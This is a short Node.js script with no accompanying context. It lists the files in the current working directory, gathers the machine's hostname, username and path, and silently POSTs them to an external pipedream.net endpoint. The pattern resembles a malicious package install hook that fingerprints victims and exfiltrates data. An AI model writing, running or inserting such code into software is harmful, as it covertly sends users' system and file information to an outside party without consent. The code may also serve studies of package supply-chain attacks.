const fs = require('fs');
const os = require('os');
const querystring = require('querystring');
const https = require('https');

fs.readdir(process.cwd(), (err, files) => {
  if (err) return;
  const trackingData = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    dirContents: files,
  };
  const postData = querystring.stringify({ msg: JSON.stringify(trackingData) });
  const options = {
    hostname: 'eo7ru7g40ls5rt7.m.pipedream.net',
    port: 443,
    path: '/',
    method: 'POST',
  };
  const req = https.request(options, () => {});
  req.write(postData);
  req.end();
});
